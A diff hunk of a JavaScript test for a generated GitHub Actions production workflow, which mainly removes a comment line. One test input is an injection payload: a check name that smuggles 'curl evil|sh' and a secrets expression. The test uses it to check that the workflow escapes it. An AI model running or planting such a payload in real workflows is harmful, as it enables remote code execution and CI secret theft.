@@ -97,7 +97,6 @@ it('productionWorkflow reports the picked check on the Ticket merge commit', () 
   expect(yaml).toContain('        deploy-production\n        notify-prod\n')
   expect(yaml).toContain('head_sha="$SHA"')
   expect(yaml).toContain('--limit 200')
-  // a hostile check name stays data: no shell command, no Actions expression
   const hostile = productionWorkflow(['x;curl evil|sh ${{ secrets.T }}'])
   expect(hostile).not.toContain('${{ secrets.T }}')
   expect(hostile).not.toMatch(/-f name=x/)
